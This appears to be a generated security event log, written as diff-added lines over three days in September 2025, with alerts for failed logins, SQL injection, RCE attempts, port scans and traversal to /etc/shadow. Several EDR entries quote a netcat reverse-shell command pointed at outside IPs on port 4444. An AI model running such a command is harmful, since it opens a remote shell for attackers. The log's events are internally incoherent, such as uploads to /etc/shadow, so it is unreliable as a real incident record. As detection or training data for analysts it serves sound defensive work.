+2025-09-02 09:44:35 WARN Multiple failed login attempts for user 'svc-api' from 5.181.80.15
+2025-09-02 09:46:00 INFO User 'lee' logged in from 192.168.0.19
+2025-09-02 09:46:05 INFO File accessed: /home/backup/docs/data.csv by user 'backup'
+2025-09-02 09:46:20 INFO Backup completed successfully
+2025-09-02 09:46:25 INFO Session timeout for user 'lee'
+2025-09-02 09:46:35 WARN Multiple failed login attempts for user 'svc-api' from 198.51.100.17
+2025-09-02 09:46:40 INFO File deleted: /home/backup/docs/data.csv by user 'backup'
+2025-09-02 09:48:15 INFO User 'admin' logged out
+2025-09-02 09:48:35 WARN Anomalous outbound traffic to 198.51.100.22 from 192.168.0.43 exceeded threshold
+2025-09-02 09:50:05 INFO File accessed: /home/monitor/docs/data.csv by user 'monitor'
+2025-09-02 09:50:10 INFO File uploaded: /var/www/html/index.php by user 'svc-api'
+2025-09-02 09:50:30 WARN Failed login attempt for user 'root' from 203.0.113.39
+2025-09-02 09:50:35 ERROR Malware signature detected in file /etc/shadow uploaded by user 'root'
+2025-09-02 09:54:00 INFO User 'dbuser' logged in from 192.168.0.44
+2025-09-02 09:54:05 INFO File accessed: /tmp/invoice.xlsx by user 'kim'
+2025-09-02 09:54:20 INFO Backup completed successfully
+2025-09-02 09:54:25 INFO Session timeout for user 'svc-api'
+2025-09-02 09:54:30 WARN Failed login attempt for user 'lee' from 198.51.100.12
+2025-09-02 09:54:35 WARN Multiple failed login attempts for user 'admin' from 203.0.113.31
+2025-09-02 10:00:00 INFO User 'monitor' logged in from 192.168.0.40
+2025-09-02 10:00:05 INFO File accessed: /api/v1/users by user 'lee'
+2025-09-02 10:00:30 WARN Failed login attempt for user 'dbuser' from 5.181.80.12
+2025-09-02 10:00:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 45.155.204.41 4444' detected by EDR
+2025-09-02 10:05:00 INFO User 'kim' logged in from 192.168.0.41
+2025-09-02 10:05:25 INFO Session timeout for user 'svc-web'
+2025-09-02 10:05:30 WARN Failed login attempt for user 'backup' from 185.220.100.11
+2025-09-02 10:05:35 ERROR Malware signature detected in file /api/v1/users uploaded by user 'dbuser'
+2025-09-02 10:05:40 INFO File deleted: /api/v1/users by user 'admin'
+2025-09-02 10:09:00 INFO User 'svc-web' logged in from 192.168.0.20
+2025-09-02 10:09:15 INFO User 'dbuser' logged out
+2025-09-02 10:09:35 WARN Multiple failed login attempts for user 'admin' from 198.51.100.20
+2025-09-02 10:14:00 INFO User 'kim' logged in from 192.168.0.11
+2025-09-02 10:14:05 INFO File accessed: /etc/shadow by user 'backup'
+2025-09-02 10:14:15 INFO User 'root' logged out
+2025-09-02 10:14:20 INFO Backup completed successfully
+2025-09-02 10:14:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-02 10:14:40 INFO File deleted: /home/admin/docs/report.docx by user 'admin'
+2025-09-02 10:18:00 INFO User 'root' logged in from 192.168.0.46
+2025-09-02 10:18:05 INFO File accessed: /api/v1/orders by user 'dbuser'
+2025-09-02 10:18:10 INFO File uploaded: /var/www/html/admin.php by user 'guest'
+2025-09-02 10:18:20 INFO Backup completed successfully
+2025-09-02 10:18:25 INFO Session timeout for user 'monitor'
+2025-09-02 10:18:35 WARN Unauthorized directory traversal attempt from 203.0.113.18 on /downloads/../../etc/shadow
+2025-09-02 10:23:00 INFO User 'backup' logged in from 192.168.0.28
+2025-09-02 10:23:15 INFO User 'kim' logged out
+2025-09-02 10:23:35 WARN Unauthorized access attempt to /var/www/html/login.php from 185.220.100.8
+2025-09-02 10:27:15 INFO User 'guest' logged out
+2025-09-02 10:27:35 ERROR RCE exploit attempt blocked from 185.220.100.4 on /api/v1/auth
+2025-09-02 10:29:10 INFO File uploaded: /var/www/html/index.php by user 'svc-api'
+2025-09-02 10:29:35 ERROR SQL Injection attempt detected from 185.220.100.27 on /var/www/html/login.php
+2025-09-02 10:29:40 INFO File deleted: /root/secure.db by user 'admin'
+2025-09-02 10:34:00 INFO User 'svc-web' logged in from 192.168.0.46
+2025-09-02 10:34:05 INFO File accessed: /etc/shadow by user 'dbuser'
+2025-09-02 10:34:10 INFO File uploaded: /etc/shadow by user 'svc-api'
+2025-09-02 10:34:20 INFO Backup completed successfully
+2025-09-02 10:34:35 ERROR RCE exploit attempt blocked from 45.155.204.47 on /var/www/html/search.php
+2025-09-02 10:36:05 INFO File accessed: /var/www/html/search.php by user 'guest'
+2025-09-03 07:00:05 INFO File accessed: /etc/passwd by user 'kim'
+2025-09-03 07:00:15 INFO User 'backup' logged out
+2025-09-03 07:00:35 WARN Unauthorized directory traversal attempt from 185.220.100.12 on /downloads/../../etc/shadow
+2025-09-03 07:02:00 INFO User 'backup' logged in from 192.168.0.26
+2025-09-03 07:02:35 WARN Brute force attack suspected for user 'guest' from 5.181.80.24
+2025-09-03 07:02:40 INFO File deleted: /api/v1/users by user 'svc-web'
+2025-09-03 07:07:00 INFO User 'admin' logged in from 192.168.0.20
+2025-09-03 07:07:05 INFO File accessed: /home/svc-api/docs/report.docx by user 'svc-api'
+2025-09-03 07:07:10 INFO File uploaded: /var/www/html/search.php by user 'backup'
+2025-09-03 07:07:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-03 07:07:40 INFO File deleted: /home/admin/docs/data.csv by user 'admin'
+2025-09-03 07:09:00 INFO User 'svc-api' logged in from 192.168.0.17
+2025-09-03 07:09:05 INFO File accessed: /var/www/html/search.php by user 'lee'
+2025-09-03 07:09:10 INFO File uploaded: /api/v1/orders by user 'guest'
+2025-09-03 07:09:35 WARN Multiple failed login attempts for user 'backup' from 45.155.204.35
+2025-09-03 07:12:00 INFO User 'monitor' logged in from 192.168.0.39
+2025-09-03 07:12:05 INFO File accessed: /home/guest/docs/report.docx by user 'guest'
+2025-09-03 07:12:10 INFO File uploaded: /home/svc-web/docs/data.csv by user 'svc-web'
+2025-09-03 07:12:20 INFO Backup completed successfully
+2025-09-03 07:12:30 WARN Failed login attempt for user 'guest' from 5.181.80.27
+2025-09-03 07:12:35 ERROR RCE exploit attempt blocked from 185.220.100.16 on /etc/shadow
+2025-09-03 07:16:00 INFO User 'root' logged in from 192.168.0.37
+2025-09-03 07:16:05 INFO File accessed: /root/secure.db by user 'guest'
+2025-09-03 07:16:20 INFO Backup completed successfully
+2025-09-03 07:16:25 INFO Session timeout for user 'monitor'
+2025-09-03 07:16:30 WARN Failed login attempt for user 'monitor' from 203.0.113.24
+2025-09-03 07:16:35 ERROR SQL Injection attempt detected from 5.181.80.30 on /login.php
+2025-09-03 07:22:00 INFO User 'backup' logged in from 192.168.0.53
+2025-09-03 07:22:10 INFO File uploaded: /api/v1/orders by user 'root'
+2025-09-03 07:22:35 ERROR SQL Injection attempt detected from 45.155.204.5 on /home/svc-web/docs/data.csv
+2025-09-03 07:24:00 INFO User 'dbuser' logged in from 192.168.0.40
+2025-09-03 07:24:05 INFO File accessed: /etc/passwd by user 'kim'
+2025-09-03 07:24:15 INFO User 'backup' logged out
+2025-09-03 07:24:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 45.155.204.2 4444' detected by EDR
+2025-09-03 07:30:00 INFO User 'backup' logged in from 192.168.0.29
+2025-09-03 07:30:05 INFO File accessed: /api/v1/auth by user 'admin'
+2025-09-03 07:30:10 INFO File uploaded: /api/v1/orders by user 'root'
+2025-09-03 07:30:35 ERROR SQL Injection attempt detected from 5.181.80.22 on /login.php
+2025-09-03 07:36:00 INFO User 'admin' logged in from 192.168.0.47
+2025-09-03 07:36:05 INFO File accessed: /etc/shadow by user 'monitor'
+2025-09-03 07:36:30 WARN Failed login attempt for user 'backup' from 185.220.100.43
+2025-09-03 07:36:35 WARN Anomalous outbound traffic to 198.51.100.49 from 192.168.0.11 exceeded threshold
+2025-09-03 07:41:00 INFO User 'lee' logged in from 192.168.0.36
+2025-09-03 07:41:05 INFO File accessed: /var/log/secure by user 'backup'
+2025-09-03 07:41:35 WARN Unauthorized directory traversal attempt from 45.155.204.20 on /downloads/../../etc/shadow
+2025-09-03 07:46:00 INFO User 'kim' logged in from 192.168.0.39
+2025-09-03 07:46:10 INFO File uploaded: /etc/shadow by user 'dbuser'
+2025-09-03 07:46:35 ERROR RCE exploit attempt blocked from 198.51.100.50 on /var/www/html/admin.php
+2025-09-03 07:50:00 INFO User 'guest' logged in from 192.168.0.59
+2025-09-03 07:50:05 INFO File accessed: /root/secure.db by user 'lee'
+2025-09-03 07:50:35 WARN Brute force attack suspected for user 'root' from 5.181.80.47
+2025-09-03 07:55:05 INFO File accessed: /uploads/malware.exe by user 'dbuser'
+2025-09-03 07:55:10 INFO File uploaded: /root/secure.db by user 'guest'
+2025-09-03 07:55:15 INFO User 'svc-api' logged out
+2025-09-03 07:55:30 WARN Failed login attempt for user 'monitor' from 203.0.113.20
+2025-09-03 07:55:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-03 07:58:00 INFO User 'backup' logged in from 192.168.0.25
+2025-09-03 07:58:05 INFO File accessed: /var/www/html/admin.php by user 'monitor'
+2025-09-03 07:58:15 INFO User 'svc-web' logged out
+2025-09-03 07:58:35 ERROR SQL Injection attempt detected from 185.220.100.47 on /home/kim/docs/data.csv
+2025-09-03 08:03:00 INFO User 'lee' logged in from 192.168.0.58
+2025-09-03 08:03:10 INFO File uploaded: /var/log/secure by user 'admin'
+2025-09-03 08:03:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 198.51.100.10 4444' detected by EDR
+2025-09-03 08:06:00 INFO User 'kim' logged in from 192.168.0.12
+2025-09-03 08:06:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 198.51.100.3 4444' detected by EDR
+2025-09-03 08:12:00 INFO User 'dbuser' logged in from 192.168.0.28
+2025-09-03 08:12:05 INFO File accessed: /home/monitor/docs/data.csv by user 'monitor'
+2025-09-03 08:12:30 WARN Failed login attempt for user 'root' from 203.0.113.35
+2025-09-03 08:12:35 ERROR SQL Injection attempt detected from 5.181.80.18 on /etc/shadow
+2025-09-03 08:15:00 INFO User 'dbuser' logged in from 192.168.0.28
+2025-09-03 08:15:15 INFO User 'svc-web' logged out
+2025-09-03 08:15:30 WARN Failed login attempt for user 'root' from 198.51.100.48
+2025-09-03 08:15:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-03 08:18:00 INFO User 'svc-web' logged in from 192.168.0.25
+2025-09-03 08:18:05 INFO File accessed: /api/v1/auth by user 'guest'
+2025-09-03 08:18:10 INFO File uploaded: /var/www/html/index.php by user 'backup'
+2025-09-03 08:18:15 INFO User 'dbuser' logged out
+2025-09-03 08:18:25 INFO Session timeout for user 'root'
+2025-09-03 08:18:35 ERROR SQL Injection attempt detected from 45.155.204.26 on /home/guest/docs/data.csv
+2025-09-03 08:22:00 INFO User 'lee' logged in from 192.168.0.24
+2025-09-03 08:22:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-03 08:25:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-03 08:25:40 INFO File deleted: /var/www/html/admin.php by user 'monitor'
+2025-09-03 08:31:00 INFO User 'kim' logged in from 192.168.0.30
+2025-09-03 08:31:35 WARN Unauthorized access attempt to /var/www/html/index.php from 5.181.80.17
+2025-09-03 08:31:40 INFO File deleted: /etc/passwd by user 'admin'
+2025-09-03 08:33:00 INFO User 'guest' logged in from 192.168.0.56
+2025-09-03 08:33:05 INFO File accessed: /tmp/report.pdf by user 'guest'
+2025-09-03 08:33:20 INFO Backup completed successfully
+2025-09-03 08:33:30 WARN Failed login attempt for user 'admin' from 185.220.100.40
+2025-09-03 08:33:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 185.220.100.40 4444' detected by EDR
+2025-09-03 08:37:00 INFO User 'kim' logged in from 192.168.0.59
+2025-09-03 08:37:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-03 08:39:25 INFO Session timeout for user 'monitor'
+2025-09-03 08:39:35 ERROR SQL Injection attempt detected from 203.0.113.8 on /tmp/report.pdf
+2025-09-03 08:43:00 INFO User 'monitor' logged in from 192.168.0.37
+2025-09-03 08:43:05 INFO File accessed: /var/www/html/admin.php by user 'lee'
+2025-09-03 08:43:15 INFO User 'lee' logged out
+2025-09-03 08:43:30 WARN Failed login attempt for user 'svc-web' from 45.155.204.8
+2025-09-03 08:43:35 WARN Multiple failed login attempts for user 'admin' from 203.0.113.12
+2025-09-03 08:43:40 INFO File deleted: /var/www/html/index.php by user 'admin'
+2025-09-03 08:48:00 INFO User 'admin' logged in from 192.168.0.25
+2025-09-03 08:48:15 INFO User 'lee' logged out
+2025-09-03 08:48:30 WARN Failed login attempt for user 'guest' from 203.0.113.10
+2025-09-03 08:48:35 WARN Multiple failed login attempts for user 'backup' from 203.0.113.32
+2025-09-03 08:52:00 INFO User 'kim' logged in from 192.168.0.52
+2025-09-03 08:52:05 INFO File accessed: /api/v1/users by user 'svc-web'
+2025-09-03 08:52:10 INFO File uploaded: /etc/passwd by user 'monitor'
+2025-09-03 08:52:35 WARN Unauthorized access attempt to /api/v1/auth from 185.220.100.42
+2025-09-03 08:57:05 INFO File accessed: /api/v1/orders by user 'svc-web'
+2025-09-03 08:57:10 INFO File uploaded: /var/www/html/search.php by user 'svc-web'
+2025-09-03 08:57:30 WARN Failed login attempt for user 'kim' from 185.220.100.7
+2025-09-03 08:57:35 WARN Unauthorized access attempt to /var/www/html/index.php from 5.181.80.44
+2025-09-03 09:02:00 INFO User 'kim' logged in from 192.168.0.34
+2025-09-03 09:02:05 INFO File accessed: /api/v1/auth by user 'lee'
+2025-09-03 09:02:25 INFO Session timeout for user 'lee'
+2025-09-03 09:02:30 WARN Failed login attempt for user 'svc-web' from 45.155.204.23
+2025-09-03 09:02:35 ERROR RCE exploit attempt blocked from 198.51.100.11 on /tmp/image.png
+2025-09-03 09:02:40 INFO File deleted: /var/www/html/admin.php by user 'monitor'
+2025-09-03 09:07:00 INFO User 'dbuser' logged in from 192.168.0.29
+2025-09-03 09:07:10 INFO File uploaded: /root/secure.db by user 'lee'
+2025-09-03 09:07:15 INFO User 'svc-api' logged out
+2025-09-03 09:07:35 WARN Port scan detected from 203.0.113.12 targeting 192.168.0.45
+2025-09-03 09:11:00 INFO User 'monitor' logged in from 192.168.0.51
+2025-09-03 09:11:05 INFO File accessed: /api/v1/auth by user 'guest'
+2025-09-03 09:11:20 INFO Backup completed successfully
+2025-09-03 09:11:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 185.220.100.35 4444' detected by EDR
+2025-09-03 09:11:40 INFO File deleted: /var/www/html/index.php by user 'admin'
+2025-09-03 09:17:10 INFO File uploaded: /var/log/secure by user 'monitor'
+2025-09-03 09:17:30 WARN Failed login attempt for user 'lee' from 203.0.113.48
+2025-09-03 09:17:35 WARN Unauthorized directory traversal attempt from 203.0.113.13 on /downloads/../../etc/shadow
+2025-09-03 09:21:00 INFO User 'svc-api' logged in from 192.168.0.56
+2025-09-03 09:21:15 INFO User 'dbuser' logged out
+2025-09-03 09:21:20 INFO Backup completed successfully
+2025-09-03 09:21:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-03 09:23:00 INFO User 'root' logged in from 192.168.0.52
+2025-09-03 09:23:05 INFO File accessed: /api/v1/orders by user 'admin'
+2025-09-03 09:23:10 INFO File uploaded: /var/www/html/login.php by user 'lee'
+2025-09-03 09:23:20 INFO Backup completed successfully
+2025-09-03 09:23:35 ERROR RCE exploit attempt blocked from 45.155.204.21 on /var/log/secure
+2025-09-03 09:28:05 INFO File accessed: /home/monitor/docs/data.csv by user 'monitor'
+2025-09-03 09:28:15 INFO User 'guest' logged out
+2025-09-03 09:28:35 WARN Anomalous outbound traffic to 5.181.80.11 from 192.168.0.21 exceeded threshold
+2025-09-03 09:28:40 INFO File deleted: /var/www/html/search.php by user 'admin'
+2025-09-03 09:31:00 INFO User 'monitor' logged in from 192.168.0.26
+2025-09-03 09:31:10 INFO File uploaded: /var/www/html/login.php by user 'svc-web'
+2025-09-03 09:31:35 ERROR Malware signature detected in file /etc/shadow uploaded by user 'root'
+2025-09-03 09:33:00 INFO User 'svc-web' logged in from 192.168.0.34
+2025-09-03 09:33:10 INFO File uploaded: /root/secure.db by user 'admin'
+2025-09-03 09:33:15 INFO User 'svc-api' logged out
+2025-09-03 09:33:30 WARN Failed login attempt for user 'root' from 185.220.100.30
+2025-09-03 09:33:35 WARN Unauthorized directory traversal attempt from 198.51.100.11 on /downloads/../../etc/shadow
+2025-09-03 09:33:40 INFO File deleted: /home/backup/docs/report.docx by user 'backup'
+2025-09-03 09:37:00 INFO User 'root' logged in from 192.168.0.53
+2025-09-03 09:37:20 INFO Backup completed successfully
+2025-09-03 09:37:30 WARN Failed login attempt for user 'lee' from 45.155.204.1
+2025-09-03 09:37:35 ERROR SQL Injection attempt detected from 185.220.100.11 on /root/secure.db
+2025-09-03 09:39:00 INFO User 'backup' logged in from 192.168.0.25
+2025-09-03 09:39:35 WARN Multiple failed login attempts for user 'root' from 5.181.80.29
+2025-09-03 09:43:00 INFO User 'svc-web' logged in from 192.168.0.24
+2025-09-03 09:43:10 INFO File uploaded: /etc/passwd by user 'backup'
+2025-09-03 09:43:25 INFO Session timeout for user 'guest'
+2025-09-03 09:43:35 WARN Unauthorized access attempt to /var/www/html/admin.php from 203.0.113.42
+2025-09-03 09:48:00 INFO User 'backup' logged in from 192.168.0.52
+2025-09-03 09:48:05 INFO File accessed: /api/v1/users by user 'backup'
+2025-09-03 09:48:20 INFO Backup completed successfully
+2025-09-03 09:48:25 INFO Session timeout for user 'kim'
+2025-09-03 09:48:35 WARN Brute force attack suspected for user 'root' from 198.51.100.24
+2025-09-03 09:48:40 INFO File deleted: /api/v1/auth by user 'admin'
+2025-09-03 09:52:00 INFO User 'root' logged in from 192.168.0.21
+2025-09-03 09:52:05 INFO File accessed: /home/monitor/docs/data.csv by user 'monitor'
+2025-09-03 09:52:15 INFO User 'root' logged out
+2025-09-03 09:52:25 INFO Session timeout for user 'backup'
+2025-09-03 09:52:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 198.51.100.4 4444' detected by EDR
+2025-09-03 09:57:20 INFO Backup completed successfully
+2025-09-03 09:57:35 ERROR SQL Injection attempt detected from 203.0.113.19 on /api/v1/users
+2025-09-03 10:00:00 INFO User 'svc-web' logged in from 192.168.0.27
+2025-09-03 10:00:05 INFO File accessed: /uploads/image.png by user 'svc-api'
+2025-09-03 10:00:35 WARN Unauthorized access attempt to /var/www/html/search.php from 203.0.113.28
+2025-09-03 10:00:40 INFO File deleted: /tmp/avatar.jpg by user 'admin'
+2025-09-03 10:04:00 INFO User 'svc-web' logged in from 192.168.0.51
+2025-09-03 10:04:10 INFO File uploaded: /etc/passwd by user 'dbuser'
+2025-09-03 10:04:20 INFO Backup completed successfully
+2025-09-03 10:04:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-03 10:09:10 INFO File uploaded: /tmp/avatar.jpg by user 'guest'
+2025-09-03 10:09:25 INFO Session timeout for user 'monitor'
+2025-09-03 10:09:30 WARN Failed login attempt for user 'monitor' from 198.51.100.7
+2025-09-03 10:09:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-03 10:12:00 INFO User 'guest' logged in from 192.168.0.54
+2025-09-03 10:12:05 INFO File accessed: /etc/shadow by user 'svc-web'
+2025-09-03 10:12:20 INFO Backup completed successfully
+2025-09-03 10:12:35 WARN Multiple failed login attempts for user 'root' from 5.181.80.15
+2025-09-03 10:17:00 INFO User 'monitor' logged in from 192.168.0.42
+2025-09-03 10:17:20 INFO Backup completed successfully
+2025-09-03 10:17:35 WARN Multiple failed login attempts for user 'backup' from 45.155.204.14
+2025-09-03 10:19:20 INFO Backup completed successfully
+2025-09-03 10:19:35 WARN Port scan detected from 45.155.204.43 targeting 192.168.0.31
+2025-09-03 10:24:00 INFO User 'root' logged in from 192.168.0.26
+2025-09-03 10:24:05 INFO File accessed: /home/monitor/docs/data.csv by user 'monitor'
+2025-09-03 10:24:35 ERROR RCE exploit attempt blocked from 5.181.80.29 on /var/www/html/search.php
+2025-09-03 10:26:00 INFO User 'guest' logged in from 192.168.0.36
+2025-09-03 10:26:10 INFO File uploaded: /api/v1/auth by user 'kim'
+2025-09-03 10:26:35 WARN Unauthorized access attempt to /home/svc-api/docs/report.docx from 203.0.113.32
+2025-09-03 10:26:40 INFO File deleted: /root/secure.db by user 'admin'
+2025-09-03 10:28:00 INFO User 'dbuser' logged in from 192.168.0.51
+2025-09-03 10:28:05 INFO File accessed: /var/log/secure by user 'kim'
+2025-09-03 10:28:15 INFO User 'kim' logged out
+2025-09-03 10:28:35 WARN Unauthorized access attempt to /uploads/avatar.jpg from 45.155.204.12
+2025-09-03 10:28:40 INFO File deleted: /api/v1/orders by user 'svc-web'
+2025-09-03 10:30:20 INFO Backup completed successfully
+2025-09-03 10:30:30 WARN Failed login attempt for user 'root' from 5.181.80.48
+2025-09-03 10:30:35 ERROR SQL Injection attempt detected from 185.220.100.24 on /home/kim/docs/data.csv
+2025-09-03 10:33:00 INFO User 'guest' logged in from 192.168.0.52
+2025-09-03 10:33:35 WARN Port scan detected from 185.220.100.17 targeting 192.168.0.39
+2025-09-03 10:37:20 INFO Backup completed successfully
+2025-09-03 10:37:25 INFO Session timeout for user 'dbuser'
+2025-09-03 10:37:35 WARN Unauthorized directory traversal attempt from 5.181.80.8 on /downloads/../../etc/shadow
+2025-09-03 10:43:00 INFO User 'kim' logged in from 192.168.0.41
+2025-09-03 10:43:35 ERROR SQL Injection attempt detected from 203.0.113.31 on /tmp/invoice.xlsx
+2025-09-03 10:47:05 INFO File accessed: /tmp/avatar.jpg by user 'lee'
+2025-09-03 10:47:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 5.181.80.26 4444' detected by EDR
+2025-09-03 10:47:40 INFO File deleted: /api/v1/users by user 'lee'
+2025-09-03 10:49:00 INFO User 'monitor' logged in from 192.168.0.28
+2025-09-03 10:49:05 INFO File accessed: /etc/passwd by user 'svc-api'
+2025-09-03 10:49:25 INFO Session timeout for user 'root'
+2025-09-03 10:49:30 WARN Failed login attempt for user 'monitor' from 185.220.100.11
+2025-09-03 10:49:35 INFO Configuration checksum verified for /etc/ssh/sshd_config
+2025-09-03 10:51:05 INFO File accessed: /api/v1/orders by user 'lee'
+2025-09-03 10:51:10 INFO File uploaded: /api/v1/users by user 'lee'
+2025-09-03 10:51:20 INFO Backup completed successfully
+2025-09-04 07:00:00 INFO User 'backup' logged in from 192.168.0.54
+2025-09-04 07:00:05 INFO File accessed: /etc/shadow by user 'backup'
+2025-09-04 07:00:35 WARN Unauthorized directory traversal attempt from 5.181.80.37 on /downloads/../../etc/shadow
+2025-09-04 07:06:00 INFO User 'guest' logged in from 192.168.0.28
+2025-09-04 07:06:30 WARN Failed login attempt for user 'svc-web' from 185.220.100.36
+2025-09-04 07:06:35 ERROR SQL Injection attempt detected from 203.0.113.21 on /login.php
+2025-09-04 07:09:05 INFO File accessed: /root/secure.db by user 'kim'
+2025-09-04 07:09:10 INFO File uploaded: /uploads/avatar.jpg by user 'lee'
+2025-09-04 07:09:35 WARN Unauthorized access attempt to /etc/shadow from 185.220.100.4
+2025-09-04 07:11:00 INFO User 'guest' logged in from 192.168.0.54
+2025-09-04 07:11:25 INFO Session timeout for user 'root'
+2025-09-04 07:11:35 WARN Unauthorized access attempt to /etc/shadow from 45.155.204.29
+2025-09-04 07:13:05 INFO File accessed: /tmp/backup.tar.gz by user 'svc-web'
+2025-09-04 07:13:30 WARN Failed login attempt for user 'svc-api' from 185.220.100.2
+2025-09-04 07:13:35 WARN Port scan detected from 45.155.204.25 targeting 192.168.0.58
+2025-09-04 07:13:40 INFO File deleted: /uploads/invoice.xlsx by user 'admin'
+2025-09-04 07:15:00 INFO User 'kim' logged in from 192.168.0.38
+2025-09-04 07:15:05 INFO File accessed: /var/www/html/admin.php by user 'svc-web'
+2025-09-04 07:15:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 198.51.100.24 4444' detected by EDR
+2025-09-04 07:19:00 INFO User 'kim' logged in from 192.168.0.13
+2025-09-04 07:19:05 INFO File accessed: /root/secure.db by user 'guest'
+2025-09-04 07:19:15 INFO User 'root' logged out
+2025-09-04 07:19:25 INFO Session timeout for user 'svc-api'
+2025-09-04 07:19:30 WARN Failed login attempt for user 'backup' from 203.0.113.8
+2025-09-04 07:19:35 WARN Unauthorized directory traversal attempt from 5.181.80.14 on /downloads/../../etc/shadow
+2025-09-04 07:19:40 INFO File deleted: /tmp/avatar.jpg by user 'root'
+2025-09-04 07:22:00 INFO User 'lee' logged in from 192.168.0.34
+2025-09-04 07:22:05 INFO File accessed: /var/www/html/login.php by user 'root'
+2025-09-04 07:22:10 INFO File uploaded: /var/www/html/search.php by user 'guest'
+2025-09-04 07:22:35 WARN Anomalous outbound traffic to 198.51.100.18 from 192.168.0.43 exceeded threshold
+2025-09-04 07:28:05 INFO File accessed: /etc/shadow by user 'lee'
+2025-09-04 07:28:30 WARN Failed login attempt for user 'root' from 198.51.100.36
+2025-09-04 07:28:35 WARN Multiple failed login attempts for user 'backup' from 45.155.204.37
+2025-09-04 07:33:00 INFO User 'kim' logged in from 192.168.0.25
+2025-09-04 07:33:05 INFO File accessed: /var/www/html/admin.php by user 'root'
+2025-09-04 07:33:35 WARN Suspicious process execution '/bin/nc -e /bin/sh 45.155.204.19 4444' detected by EDR
+2025-09-04 07:36:00 INFO User 'monitor' logged in from 192.168.0.22
+2025-09-04 07:36:10 INFO File uploaded: /uploads/backup.tar.gz by user 'admin'
+2025-09-04 07:36:20 INFO Backup completed successfully
+2025-09-04 07:36:35 WARN Unauthorized directory traversal attempt from 198.51.100.4 on /downloads/../../etc/shadow
+2025-09-04 07:40:00 INFO User 'backup' logged in from 192.168.0.36
+2025-09-04 07:40:05 INFO File accessed: /uploads/invoice.xlsx by user 'kim'
+2025-09-04 07:40:20 INFO Backup completed successfully
+2025-09-04 07:40:25 INFO Session timeout for user 'guest'
+2025-09-04 07:40:30 WARN Failed login attempt for user 'admin' from 185.220.100.43
+2025-09-04 07:40:35 WARN Multiple failed login attempts for user 'monitor' from 203.0.113.24
+2025-09-04 07:46:05 INFO File accessed: /var/www/html/login.php by user 'svc-web'
+2025-09-04 07:46:20 INFO Backup completed successfully
+2025-09-04 07:46:25 INFO Session timeout for user 'root'
+2025-09-04 07:46:35 ERROR Malware signature detected in file /uploads/malware.exe uploaded by user 'monitor'
+2025-09-04 07:52:15 INFO User 'svc-web' logged out
+2025-09-04 07:52:30 WARN Failed login attempt for user 'root' from 185.220.100.37
+2025-09-04 07:52:35 WARN Unauthorized access attempt to /home/backup/docs/report.docx from 45.155.204.6
+2025-09-04 07:52:40 INFO File deleted: /var/www/html/login.php by user 'kim'
+2025-09-04 07:54:10 INFO File uploaded: /home/dbuser/docs/data.csv by user 'dbuser'
+2025-09-04 07:54:35 WARN Multiple failed login attempts for user 'guest' from 45.155.204.38
+2025-09-04 07:56:00 INFO User 'svc-web' logged in from 192.168.0.27
+2025-09-04 07:56:05 INFO File accessed: /root/secure.db by user 'guest'
+2025-09-04 07:56:30 WARN Failed login attempt for user 'backup' from 198.51.100.43
+2025-09-04 07:56:35 WARN Port scan detected from 203.0.113.16 targeting 192.168.0.59
+2025-09-04 07:56:40 INFO File deleted: /var/www/html/admin.php by user 'root'
+2025-09-04 08:02:00 INFO User 'admin' logged in from 192.168.0.25
+2025-09-04 08:02:05 INFO File accessed: /api/v1/orders by user 'dbuser'
+2025-09-04 08:02:15 INFO User 'admin' logged out
+2025-09-04 08:02:35 WARN Port scan detected from 203.0.113.33 targeting 192.168.0.25
+2025-09-04 08:06:00 INFO User 'root' logged in from 192.168.0.46
+2025-09-04 08:06:05 INFO File accessed: /etc/shadow by user 'monitor'
+2025-09-04 08:06:15 INFO User 'monitor' logged out
+2025-09-04 08:06:30 WARN Failed login attempt for user 'svc-api' from 185.220.100.22
+2025-09-04 08:06:35 WARN Brute force attack suspected for user 'guest' from 203.0.113.34
+2025-09-04 08:06:40 INFO File deleted: /api/v1/auth by user 'admin'
+2025-09-04 08:09:00 INFO User 'guest' logged in from 192.168.0.57
+2025-09-04 08:09:30 WARN Failed login attempt for user 'monitor' from 45.155.204.45
+2025-09-04 08:09:35 WARN Multiple failed login attempts for user 'kim' from 198.51.100.2
+2025-09-04 08:11:00 INFO User 'dbuser' logged in from 192.168.0.50
+2025-09-04 08:11:20 INFO Backup completed successfully
+2025-09-04 08:11:35 WARN Anomalous outbound traffic to 198.51.100.27 from 192.168.0.23 exceeded threshold
+2025-09-04 08:14:00 INFO User 'admin' logged in from 192.168.0.19
+2025-09-04 08:14:10 INFO File uploaded: /var/log/secure by user 'lee'
+2025-09-04 08:14:35 WARN Multiple failed login attempts for user 'backup' from 198.51.100.25
+2025-09-04 08:19:00 INFO User 'backup' logged in from 192.168.0.13
+2025-09-04 08:19:05 INFO File accessed: /var/www/html/admin.php by user 'kim'
+2025-09-04 08:19:10 INFO File uploaded: /var/log/secure by user 'dbuser'
+2025-09-04 08:19:30 WARN Failed login attempt for user 'guest' from 203.0.113.10
+2025-09-04 08:19:35 ERROR SQL Injection attempt detected from 203.0.113.2 on /login.php
+2025-09-04 08:19:40 INFO File deleted: /var/www/html/search.php by user 'root'
+2025-09-04 08:21:00 INFO User 'svc-api' logged in from 192.168.0.30
+2025-09-04 08:21:05 INFO File accessed: /api/v1/auth by user 'monitor'
+2025-09-04 08:21:15 INFO User 'guest' logged out
+2025-09-04 08:21:30 WARN Failed login attempt for user 'guest' from 185.220.100.12
+2025-09-04 08:21:35 WARN Anomalous outbound traffic to 45.155.204.5 from 192.168.0.12 exceeded threshold
